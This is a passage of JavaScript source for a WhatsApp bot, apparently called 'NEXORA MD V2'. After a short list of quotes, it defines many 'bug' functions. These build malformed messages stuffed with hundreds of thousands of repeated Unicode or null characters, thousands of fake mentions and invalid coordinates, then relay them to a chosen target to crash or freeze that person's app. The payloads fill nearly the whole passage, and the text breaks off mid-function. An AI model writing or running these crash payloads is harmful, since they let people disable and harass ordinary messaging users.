    "The graveyard is full of indispensable men. — Charles de Gaulle",
    "Valar Morghulis. — George R.R. Martin",
    "Memento Mori. — Latin Proverb",
    "Veni, Vidi, Vici. — Julius Caesar",
    "Everything ends. — †Sir Demon†",
    "Peace is a lie. — †Sir Demon†",
    "The void is calling. — †Sir Demon†",
    "Final sanity check: Failed. — †Sir Demon†",
    "Rebirth requires fire. — †Sir Demon†",
    "Nothing lasts forever, not even your pain. — †Sir Demon†",
    "Nexora Has Spoken. — †Sir Demon†",
    "Only those who are asleep make no mistakes. — †Sir Demon†",
    "Silence is the ultimate weapon of power. — †Sir Demon†",
    "Hell is not a place, it’s a mindset. — †Sir Demon†",
    "Shadows don't lie; they just hide the truth. — †Sir Demon†",
    "I am the end of your beginning. — †Sir Demon†",
    "Blood is the ink of history. — †Sir Demon†"
];

// 1. Define the random selection execution helper function
const getCustomQuote = () => nexoraQuotesList[Math.floor(Math.random() * nexoraQuotesList.length)];


const akatsukiEmojis = ['⚡', '🔥', '💀', '⚔️', '👁️', '🌙', '💥', '⛈️'];
const akatsukiEmoji = () => akatsukiEmojis[Math.floor(Math.random() * akatsukiEmojis.length)];
// Paste this inside module.exports = empire = async (empire, m, chatUpdate, store) => {
// Usually near the start of the try { block
// --- DYNAMIC NEXORA SMART BRIDGE ---
// This part detects if the bot is called by name and triggers your existing cases

async function NullLenght(target, mention = false) {
  const LxP = {
    imageMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0&mms3=true",
      mimetype: "image/jpeg",
      fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
      fileLength: 388944,
      height: 1600,
      width: 1200,
      mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
      fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
      directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
      mediaKeyTimestamp: "1776937541",
      jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAQIDBAUGAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAAD58BctFpKNM0lAdfIt7o4ra13UxyjrwxAZxaaC952s5u7OkdlvHY37Dy0ZDpmyosqAISAAAEAB/8QAJxAAAgECBQMEAwAAAAAAAAAAAQIAAxEEEiAhMRATMhQiQVEVMFL/2gAIAQEAAT8A/X23sDlMNOoNypnbfb2mGk4NipnaqZb5TooFKd3aDGEArlBEOMbKQBGxzMqgoNocWTyonrG2EqqNiDzpVSxsIQX2C8cQqy8qdARjaBVHLQso4X4mdkGxsSIKrhg19xPXMLB0DCCvganlTsYMLg6ng8/G0/6zf76U6JexBEIJ3NNYadgTkWOCaY9qgTiAkcGCvVA8z1DFYXb7mZvuBj020nUYPnQTB0M//8QAIxEBAAIAAwkBAAAAAAAAAAAAAQACERNBEBIgITAxUVNxkv/aAAgBAgEBPwDhHBxm/bzG9jWNlOe0iVe4MyqaNq/GZT77fk6f/8QAIBEAAQMDBQEAAAAAAAAAAAAAAQACERASUQMTMFKRkv/aAAgBAwEBPwBQVFWm0ytx+UHvIReSINTS9/b0Sr3Y0/nj/9k=",
      contextInfo: {
        pairedMediaType: "NOT_PAIRED_MEDIA",
        isQuestion: true,
        isGroupStatus: true
      },
      caption: " 丫ЦКɪПΛ - t.me/FunctionBug ",
      scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
      scanLengths: [
        2899999999999999077,
        1799999999999998555,
        7699999999999999148,
        1069999999999999164
      ],
      midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
    }
  };

  let msg = generateWAMessageFromContent(target, LxP, {});

  await empire.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });

  if (mention) {
    await empire.relayMessage(
      target,
      {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25
            }
          }
        }
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "false" },
            content: undefined
          }
        ]
      }
    );
  }
    }


async function xCursedNFCrashIos(target) {
  try {
    // Using empire as your primary socket
    let msg = {
      groupStatusMessageV2: {
        message: {
          locationMessage: {
            degreesLatitude: -9.09999262999,
            degreesLongitude: 199.9996311899,
            name: "🧪⃟꙰ 𝐱𝐂𝐮𝐫𝐬𝐞𝐝𝐍𝐅" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000), 
            address: "🧪⃟꙰ 𝐱𝐂𝐮𝐫𝐬𝐞𝐝𝐍𝐅" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000), 
            url: `https://wa.me/meta.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`,
            jpegThumbnail: Buffer.from([0x00]),
          },
        },
      },
    };
    
    // Using relayMessage directly via empire
    await empire.relayMessage(target, msg, { 
      // Participant is only needed for groups; for private/LID, it's better to omit to avoid the toString error
      ...(target.endsWith('@g.us') ? { participant: { jid: target } } : {}),
      messageId: empire.generateMessageTag() 
    });

    console.log(`📡 Relayed full payload to: ${target}`);

  } catch (err) {
    // This logs the error without stopping the bot's execution
    console.error(`Gagal Mengirim Bug Ke ${target}:`, err.message);   
  }
}

        async function ExoGsButonsRspn(target, ptcp = true) {
  let mentions = [
    "13651718@s.whatsapp.net",
    ...Array.from(
      { length: 1900 },
      () => "1" + Math.floor(Math.random() * 7000000) + "@s.whatsapp.net"
    )
  ];
  
  const msg = generateWAMessageFromContent(
    target, 
    {
      buttonsResponseMessage: {
        selectedButtonId: "payment_info",
        selectedDisplayText: "𝐄𝐱𝐨𝐭𝐢𝐜𝐬𝐓𝐫𝟒𝐬𝐡",
        contextInfo: {
          participant: target,
          mentionedJid: mentions,
          isForwarded: true,
          forwardingScore: 9999,
          urlTrackingMap: {
            urlTrackingMapElements: Array.from({ length: 20000 }, () => ({})),
          }
        }
      }
    },
    {}
  );
  
  await empire.relayMessage(target, {
    groupStatusMessageV2: {
      message: msg.message,
    }
  }, ptcp ?
  {
    messageId: msg.key.id,
    participant: { jid: target },
  } : { messageId: msg.key.id });
}
        async function DelayHardTod(empire, target, ptcp = true) {
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          header: {
            stickerPackMessage: {
              stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
              name: "KingGupong!!" + "ꦾ".repeat(45000),
              publisher: "ꦽ".repeat(25000),
              stickers: [],
              fileLength: 12260,
              fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
              fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
              mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
              directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw",
              height: 999999,
              width: 999999,
              mediaKeyTimestamp: "17475087208274",
              isAnimated: false,
              isAvatar: false,
              isAiSticker: false,
              isLottie: false,
              emojis: ["🕸", "🕷", "🦠", "🌹"],
            }
          },
          body: {
            text: "KingGupong",
            format: "DEFAULT"
          },
          footer: {
            text: "KingGupong....."
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(900000)}\"}}`,
            version: 3
          }
        }
      }
    }
  }, { userJid: empire.user.id });

  await empire.relayMessage(target, msg.message, ptcp ? {
    messageId: msg.key.id,
    participant: { jid: target }
  } : {
    messageId: msg.key.id
  });
}



        async function blank1(target) {
            try {
                const anta = 'ោ៝'.repeat(50000);
                const nyocot = 'ꦾ'.repeat(50000);
                const msg = {

                    newsletterAdminInviteMessage: {
                        newsletterJid: "1234567891234@newsletter",
                        newsletterName: "sv Danzz ya bang" + "ោ៝".repeat(50000),
                        caption: "Halo" + anta + nyocot + "ោ៝".repeat(50000),
                        inviteExpiration: "90000",
                        contextInfo: {
                            participant: "0@s.whatsapp.net",
                            remoteJid: "status@broadcast",
                            mentionedJid: ["0@s.whatsapp.net", "13135550002@s.whatsapp.net"],
                        },
                    },
                };

                await empire.relayMessage(target, msg, {
                    participant: { jid: target },
                    messageId: null,
                });
                console.log(chalk.red.bold(`Succes Sending Bug Blank To Target ${target}`));
            } catch (err) {
                console.error("Gagal Mengirim Bug", err);
            }
        }

        async function ForceXFrezee(target) {
            let crash = JSON.stringify({
                action: "x",
                data: "x"
            });

            await empire.relayMessage(target, {
                stickerPackMessage: {
                    stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
                    name: "𝗡𝗘𝗫𝗢𝗥𝗔 𝗠𝗗 𝗩2 Destroyed" + "ꦾ".repeat(77777),
                    publisher: "𝗡𝗘𝗫𝗢𝗥𝗔 𝗠𝗗 𝗩2",
                    stickers: [
                        {
                            fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
                            isAnimated: false,
                            emojis: [""],
                            accessibilityLabel: "",
                            isLottie: false,
                            mimetype: "image/webp"
                        },
                        {
                            fileName: "fMysGRN-U-bLFa6wosdS0eN4LJlVYfNB71VXZFcOye8=.webp",
                            isAnimated: false,
                            emojis: [""],
                            accessibilityLabel: "",
                            isLottie: false,
                            mimetype: "image/webp"
                        },
                        {
                            fileName: "gd5ITLzUWJL0GL0jjNofUrmzfj4AQQBf8k3NmH1A90A=.webp",
                            isAnimated: false,
                            emojis: [""],
                            accessibilityLabel: "",
                            isLottie: false,
                            mimetype: "image/webp"
                        },
                        {
                            fileName: "qDsm3SVPT6UhbCM7SCtCltGhxtSwYBH06KwxLOvKrbQ=.webp",
                            isAnimated: false,
                            emojis: [""],
                            accessibilityLabel: "",
                            isLottie: false,
                            mimetype: "image/webp"
                        },
                        {
                            fileName: "gcZUk942MLBUdVKB4WmmtcjvEGLYUOdSimKsKR0wRcQ=.webp",
                            isAnimated: false,
                            emojis: [""],
                            accessibilityLabel: "",
                            isLottie: false,
                            mimetype: "image/webp"
                        },
                        {
                            fileName: "1vLdkEZRMGWC827gx1qn7gXaxH+SOaSRXOXvH+BXE14=.webp",
                            isAnimated: false,
                            emojis: [""],
                            accessibilityLabel: "Jawa Jawa",
                            isLottie: false,
                            mimetype: "image/webp"
                        },
                        {
                            fileName: "dnXazm0T+Ljj9K3QnPcCMvTCEjt70XgFoFLrIxFeUBY=.webp",
                            isAnimated: false,
                            emojis: [""],
                            accessibilityLabel: "",
                            isLottie: false,
                            mimetype: "image/webp"
                        },
                        {
                            fileName: "gjZriX-x+ufvggWQWAgxhjbyqpJuN7AIQqRl4ZxkHVU=.webp",
                            isAnimated: false,
                            emojis: [""],
                            accessibilityLabel: "",
                            isLottie: false,
                            mimetype: "image/webp"
                        }
                    ],
                    fileLength: "3662919",
                    fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
                    fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
                    mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
                    directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4&oh=01_Q5Aa1gFI6_8-EtRhLoelFWnZJUAyi77CMezNoBzwGd91OKubJg&oe=685018FF&_nc_sid=5e03e0",
                    contextInfo: {
                        remoteJid: "X",
                        participant: "0@s.whatsapp.net",
                        stanzaId: "1234567890ABCDEF",
                        mentionedJid: [
                            "6285215587498@s.whatsapp.net",
                            ...Array.from({ length: 1900 }, () =>
                                `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
                            )
                        ]
                    },
                    packDescription: "",
                    mediaKeyTimestamp: "1747502082",
                    trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
                    thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc?ccb=11-4&oh=01_Q5Aa1gEwIwk0c_MRUcWcF5RjUzurZbwZ0furOR2767py6B-w2Q&oe=685045A5&_nc_sid=5e03e0",
                    thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
                    thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
                    thumbnailHeight: 252,
                    thumbnailWidth: 252,
                    imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
                    stickerPackSize: "3680054",
                    stickerPackOrigin: "USER_CREATED",
                    quotedMessage: {
                        callLogMesssage: {
                            isVideo: true,
                            callOutcome: "REJECTED",
                            durationSecs: "1",
                            callType: "SCHEDULED_CALL",
                            participants: [
                                { jid: target, callOutcome: "CONNECTED" },
                                { target: "0@s.whatsapp.net", callOutcome: "REJECTED" },
                                { target: "13135550002@s.whatsapp.net", callOutcome: "ACCEPTED_ELSEWHERE" },
                                { target: "status@broadcast", callOutcome: "SILENCED_UNKNOWN_CALLER" },
                            ]
                        }
                    },
                }
            }, {});

            const msg = generateWAMessageFromContent(target, {
                viewOnceMessageV2: {
                    message: {
                        listResponseMessage: {
                            title: "ᴺᴱˣᴼᴿᴬ ᵂᴬˢ ᴴᴱᴿᴱ" + "ꦾ",
                            listType: 4,
                            buttonText: { displayText: "🩸" },
                            sections: [],
                            singleSelectReply: {
                                selectedRowId: "⌜⌟"
                            },
                            contextInfo: {
                                mentionedJid: [target],
                                participant: "0@s.whatsapp.net",
                                remoteJid: "who know's ?",
                                quotedMessage: {
                                    paymentInviteMessage: {
                                        serviceType: 1,
                                        expiryTimestamp: Math.floor(Date.now() / 1000) + 60
                                    }
                                },
                                externalAdReply: {
                                    title: "☀️",
                                    body: "🩸",
                                    mediaType: 1,
                                    renderLargerThumbnail: false,
                                    nativeFlowButtons: [
                                        {
                                            name: "payment_info",
                                            buttonParamsJson: crash
                                        },
                                        {
                                            name: "call_permission_request",
                                            buttonParamsJson: crash
                                        },
                                    ],
                                },
                                extendedTextMessage: {
                                    text: "ꦾ".repeat(20000) + "@1".repeat(20000),
                                    contextInfo: {
                                        stanzaId: target,
                                        participant: target,
                                        quotedMessage: {
                                            conversation:
                                                "😈😈😣💀" +
                                                "ꦾ࣯࣯".repeat(50000) +
                                                "@1".repeat(20000),
                                        },
                                        disappearingMode: {
                                            initiator: "CHANGED_IN_CHAT",
                                            trigger: "CHAT_SETTING",
                                        },
                                    },
                                    inviteLinkGroupTypeV2: "DEFAULT",
                                },
                                participant: target,
                            }
                        }
                    }
                }
            }, {})
            await empire.relayMessage(target, msg.message, {
                messageId: msg.key.id
            });
            console.log(chalk.red(`Succes Send Bug To ${target}`));
        }

        async function BugGb1(target) {
            try {
                const message = {
                    botInvokeMessage: {
                        message: {
                            newsletterAdminInviteMessage: {
                                newsletterJid: `33333333333333333@newsletter`,
                                newsletterName: "hokage" + "ꦾ".repeat(120000),
                                jpegThumbnail: "https://files.catbox.moe/e17h49.jpg",
                                caption: "ꦽ".repeat(120000) + "@0".repeat(120000),
                                inviteExpiration: Date.now() + 1814400000, // 21 hari
                            },
                        },
                    },
                    nativeFlowMessage: {
                        messageParamsJson: "𝗡𝗘𝗫𝗢𝗥𝗔 𝗠𝗗 𝗩2",
                        buttons: [
                            {
                                name: "call_permission_request",
                                buttonParamsJson: "{}",
                            },
                            {
                                name: "galaxy_message",
                                paramsJson: {
                                    "screen_2_OptIn_0": true,
                                    "screen_2_OptIn_1": true,
                                    "screen_1_Dropdown_0": "nullOnTop",
                                    "screen_1_DatePicker_1": "1028995200000",
                                    "screen_1_TextInput_2": "null@gmail.com",
                                    "screen_1_TextInput_3": "94643116",
                                    "screen_0_TextInput_0": "\u0000".repeat(500000),
                                    "screen_0_TextInput_1": "SecretDocu",
                                    "screen_0_Dropdown_2": "#926-Xnull",
                                    "screen_0_RadioButtonsGroup_3": "0_true",
                                    "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
                                },
                            },
                        ],
                    },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 10 }, () => "0@s.whatsapp.net"),
                        groupMentions: [
                            {
                                groupJid: "0@s.whatsapp.net",
                                groupSubject: "XvoludUltra!",
                            },
                        ],
                    },
                };

                await empire.relayMessage(target, message, {
                    userJid: target,
                });
            } catch (err) {
                console.error("Error sending newsletter:", err);
            }
        }

        async function BugGb12(target, ptcp = true) {
            try {
                const message = {
                    botInvokeMessage: {
                        message: {
                            newsletterAdminInviteMessage: {
                                newsletterJid: `999999999999999999@newsletter`,
                                newsletterName: "𝗡𝗘𝗫𝗢𝗥𝗔 𝗠𝗗 𝗩2" + "ꦾ".repeat(120000),
                                jpegThumbnail: "https://files.catbox.moe/laws24.jpg",
                                caption: "ꦽ".repeat(120000) + "@9".repeat(120000),
                                inviteExpiration: Date.now() + 1814400000, // 21 hari
                            },
                        },
                    },
                    nativeFlowMessage: {
                        messageParamsJson: "minato!",
                        buttons: [
                            {
                                name: "call_permission_request",
                                buttonParamsJson: "{}",
                            },
                            {
                                name: "galaxy_message",
                                paramsJson: {
                                    "screen_2_OptIn_0": true,
                                    "screen_2_OptIn_1": true,
                                    "screen_1_Dropdown_0": "nullOnTop",
                                    "screen_1_DatePicker_1": "1028995200000",
                                    "screen_1_TextInput_2": "null@gmail.com",
                                    "screen_1_TextInput_3": "94643116",
                                    "screen_0_TextInput_0": "\u0018".repeat(50000),
                                    "screen_0_TextInput_1": "SecretDocu",
                                    "screen_0_Dropdown_2": "#926-Xnull",
                                    "screen_0_RadioButtonsGroup_3": "0_true",
                                    "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
                                },
                            },
                        ],
                    },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 10 }, () => "0@s.whatsapp.net"),
                        groupMentions: [
                            {
                                groupJid: "0@s.whatsapp.net",
                                groupSubject: "XvoludUltra",
                            },
                        ],
                    },
                };

                await empire.relayMessage(target, message, {
                    userJid: target,
                });
            } catch (err) {
                console.error("Error sending newsletter:", err);
            }
        }

        async function xgroupnulL(target) {
            await empire.relayMessage(
                target,
                {
                    viewOnceMessage: {
                        message: {
                            interactiveResponseMessage: {
                                body: {
                                    text: " XvoludUltra",
                                    format: "DEFAULT"
                                },
                                nativeFlowResponseMessage: {
                                    name: "call_permission_request",
                                    paramsJson: "\u0000".repeat(1000000),
                                    version: 3
                                }
                            },
                            contextInfo: {
                                mentionedJid: [
                                    ...Array.from(
                                        { length: 1950 },
                                        () => `1${Math.floor(Math.random() * 999999)}@s.whatsapp.net`
                                    )
                                ]
                            }
                        }
                    }
                },
                {}
            );
        }
        

        async function DelayGroup(target) {
            const mentionedList = Array.from({ length: 1950 }, () => `1${Math.floor(Math.random() * 999999)}@s.whatsapp.net`);

            await empire.sendMessage(target, {
                text: "XvoludUltra",
                mentions: target,
                contextInfo: {
                    mentionedJid: mentionedList,
                    isGroupMention: true
                }
            });
        }

        async function Xblanknoclick(target) {
            const ButtonsPush = [
                {
                    name: "single_select",
                    buttonParamsJson: JSON.stringify({
                        title: "ꦽ".repeat(7000),
                        sections: [
                            {
                                title: "\u0000",
                                rows: [],
                            },
                        ],
                    }),
                },
            ];

            for (let i = 0; i < 10; i++) {
                ButtonsPush.push(
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "ꦽ".repeat(7000),
                        })
                    },
                    {
                        name: "mpm",
                        buttonParamsJson: JSON.stringify({
                            status: true
                        })
                    },
                    {
                        name: "cta_call",
                        buttonParamsJson: JSON.stringify({
                            status: true
                        })
                    },
                );
            }

            const msg = await generateWAMessageFromContent(
                target,
                {
                    viewOnceMessage: {
                        message: {
                            interactiveMessage: {
                                header: {
                                    title: "ោ៝".repeat(40000),
                                    locationMessage: {
                                        degreesLatitude: 0,
                                        degreesLongtitude: 0,
                                    },
                                    hasMediaAttachment: true,
                                },
                                body: {
                                    text: "Hay" +
                                        "ꦽ".repeat(45000) +
                                        "ោ៝".repeat(20000),
                                },
                                nativeFlowMessage: {
                                    messageParamsJson: "{".repeat(10000),
                                    buttons: ButtonsPush,
                                },
                                contextInfo: {
                                    participant: target,
                                    mentionedJid: [
                                        "131338822@s.whatsapp.net",
                                        ...Array.from(
                                            { length: 1900 },
                                            () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                                        ),
                                    ],
                                    remoteJid: "X",
                                    participant: target,
                                    stanzaId: "1234567890ABCDEF",
                                    quotedMessage: {
                                        paymentInviteMessage: {
                                            serviceType: 3,
                                            expiryTimestamp: Date.now() + 1814400000
                                        },
                                    },
                                },
                            },
                        },
                    },
                },
                {}
            );

            await empire.relayMessage(target, msg.message, {
                messageId: msg.key.id,
                participant: { jid: target },
            });
        }
        

        async function XinsooInvisV1(target) {
            const msg1 = await generateWAMessageFromContent(
                target,
                {
                    extendedTextMessage: {
                        text: "\n".repeat(9000),
                        contextInfo: {
                            participant: target,
                            mentionedJid: [
                                "13527337@s.whastapp.net",
                                ...Array.from(
                                    { length: 1900 },
                                    () => "2" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                                ),
                            ],
                        },
                    },
                },
                {}
            );

            const msg2 = await generateWAMessageFromContent(
                target,
                {
                    extendedTextMessage: {
                        text: "\n".repeat(9000),
                        contextInfo: {
                            participant: target,
                            mentionedJid: [
                                "13527337@s.whastapp.net",
                                ...Array.from(
                                    { length: 1900 },
                                    () => "2" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                                ),
                            ],
                        },
                    },
                },
                {}
            );

            await empire.relayMessage(target, msg1.message, {
                messageId: msg1.key.id,
                participant: { jid: target },
            });
            await empire.sendMessage(target, {
                delete: msg1.key,
            });

            await empire.relayMessage(target, msg2.message, {
                messageId: msg2.key.id,
                participant: { jid: target },
            });
            await empire.sendMessage(target, {
                delete: msg2.key,
            });
        }

        async function LocaXotion(target) {
            await empire.relayMessage(
                target, {
                viewOnceMessage: {
                    message: {
                        liveLocationMessage: {
                            degreesLatitude: 197 - 7728 - 82882,
                            degreesLongitude: -111 - 188839938,
                            caption: ' GROUP_MENTION ' + "ꦿꦸ".repeat(150000) + "@1".repeat(70000),
                            sequenceNumber: '0',
                            jpegThumbnail: '',
                            contextInfo: {
                                forwardingScore: 177,
                                isForwarded: true,
                                quotedMessage: {
                                    documentMessage: {
                                        contactVcard: true
                                    }
                                },
                                groupMentions: [{
                                    groupJid: "1999@newsletter",
                                    groupSubject: " Subject "
                                }]
                            }
                        }
                    }
                }
            }, {
                participant: {
                    jid: target
                }
            }
            );
        }

        async function forclose(target) {
            // Add rate limiting - 𝗡𝗘𝗫𝗢𝗥𝗔 𝗠𝗗 𝗩2't let this function be called too fast
            const now = Date.now();
            if (global.lastForclose && (now - global.lastForclose) < 5000) {
                console.log("⏱️ forclose called too soon, skipping");
                return;
            }
            global.lastForclose = now;

            // Add timeout to prevent hanging
            const timeoutPromise = new Promise((_, reject) => {
                setTimeout(() => reject(new Error("forclose timeout")), 10000);
            });

            try {
                // Check if target is valid
                if (!target || typeof target !== 'string') {
                    console.error("❌ Invalid target for forclose");
                    return;
                }

                // Check if messageKontol exists
                if (!messageKontol) {
                    console.error("❌ messageKontol is not defined");
                    return;
                }

                // Use Promise.race to add timeout
                await Promise.race([
                    (async () => {
                        const msg = generateWAMessageFromContent(target, {
                            viewOnceMessage: {
                                message: {
                                    extendedTextMessage: {
                                        text: "*𝗡𝗘𝗫𝗢𝗥𝗔 𝗠𝗗 𝗩2 Destroyed*",
                                        contextInfo: {
                                            mentionedJid: [target, "5521992999999@s.whatsapp.net"],
                                            forwardingScore: 999,
                                            isForwarded: false,
                                            stanzaId: "FTG-EE62BD88F22C",
                                            participant: "5521992999999@s.whatsapp.net",
                                            remoteJid: target,
                                            quotedMessage: {
                                                callLogMessage: {
                                                    isVideo: false,
                                                    callOutcome: "1",
                                                    durationSecs: "0",
                                                    callType: "REGULAR",
                                                    participants: [
                                                        {
                                                            jid: target,
                                                            callOutcome: "1"
                                                        }
                                                    ]
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }, {
                            quoted: messageKontol
                        });

                        await empire.relayMessage(target, msg.message, {
                            messageId: msg.key.id
                        });

                        console.log(chalk.green(`✅ forclose completed for ${target}`));
                    })(),
                    timeoutPromise
                ]);

            } catch (err) {
                console.error("❌ forclose error:", err.message);
                // 𝗡𝗘𝗫𝗢𝗥𝗔 𝗠𝗗 𝗩2't crash, just log the error
            }
        }

        //Quotednya


        async function CarouselVY4(empire, target) {
            const img = {
                url: "https://mmg.whatsapp.net/o1/v/t24/f2/m239/AQMDTeV5_VA-OBFSuqdqXYX0-53ZJQHkoQR944ZaGcoo_GA4-3_-FypseU9Bi7f5ORRn-BQYL8vbFpfXOmxRdLVz8FkzxTf3SyA11Biz3Q?ccb=9-4&oh=01_Q5Aa2QFfCY7O3IquSb0Fvub083w1zLcGVzWCk-P1hjnUMKeSxQ&oe=68DA0F65&_nc_sid=e6ed6c&mms3=true",
                mimetype: "image/jpeg",
                fileSha256: Buffer.from("i4ZgOwy4PHQmtxW+VgKPJ0LEE9i7XfAwJYk4DVKnjB4=", "base64"),
                fileLength: "62265",
                height: 1080,
                width: 1080,
                mediaKey: Buffer.from("qaiU0wrsmuE9outTy1QEV8TnPwlNAFS5kqmTLBXBugM=", "base64"),
                fileEncSha256: Buffer.from("Vw0MGUhP27kXt9W4LxnpzzYGrozU8pbzafHsxoegPq8=", "base64"),
                directPath: "/o1/v/t24/f2/m239/AQMDTeV5_VA-OBFSuqdqXYX0-53ZJQHkoQR944ZaGcoo_GA4-3_-FypseU9Bi7f5ORRn-BQYL8vbFpfXOmxRdLVz8FkzxTf3SyA11Biz3Q?ccb=9-4&oh=01_Q5Aa2QFfCY7O3IquSb0Fvub083w1zLcGVzWCk-P1hjnUMKeSxQ&oe=68DA0F65&_nc_sid=e6ed6c",
                mediaKeyTimestamp: "1756530813",
                jpegThumbnail: Buffer.from(
                    "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAvAAEAAgMBAAAAAAAAAAAAAAAAAQMCBAUGAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAADzuFlZHovO7xOj1uUREwAX0yI6XNtOxw93RIABlmFk6+5OmVN9pzsLte4BLKwZYjr6GuJgAAAAJBaD/8QAJhAAAgIBAgQHAQAAAAAAAAAAAQIAAxEQEgQgITEFExQiMkFhQP/aAAgBAQABPwABSpJOvhZwk8RIPFvy2KEfAh0Bfy0RSf2ekqKZL+6ONrEcl777CdeFYDIznIjrUF3mN1J5AQIdKX2ODOId9gIPQ8qLuOI9TJieQMd4KF+2+pYu6tK8/GenGO8eoqQJ0x+6Y2EGWWl8QMQQYrpZ2QZljV4A2e4nqRLaUKDb0jhE7EltS+RqrFTkSx+HrSsrgkjrH4hmhOf4xABP/8QAGBEAAwEBAAAAAAAAAAAAAAAAAREwUQD/2gAIAQIBAT8AmjvI7X//xAAbEQAABwEAAAAAAAAAAAAAAAAAAQIREjBSIf/aAAgBAwEBPwCuSMCSMA2fln//2Q==",
                    "base64"
                ),
                contextInfo: {},
                scansSidecar: "lPDK+lpgZstxxk05zbcPVMVPlj+Xbmqe2tE9SKk+rOSLSXfImdNthg==",
                scanLengths: [7808, 22667, 9636, 22154],
                midQualityFileSha256: "kCJoJE5LX9w/KxdIQQgGtkQjP5ogRE6HWkAHRkBWHWQ="
            };

            for (let i = 0; i < 5; i++) {
                const cards = [
                    {
                        header: {
                            hasMediaAttachment: true,
                            imageMessage: img,
                            title: "\u2060".repeat(50000) + "You Hate Me? \n" + i
                        },
                        body: { text: "ꦾ".repeat(999999) },
                        footer: { text: "Made by haters #1st" + i },
                        nativeFlowMessage: {
                            messageParamsJson: "",
                            buttons: [
                                {
                                    name: "single_select",
                                    buttonParamsJson: "\u0000".repeat(1000)
                                },
                                {
                                    name: "cta_copy",
                                    buttonParamsJson: "{\"copy_code\":\"62222222\",\"expiry\":1692375600000}"
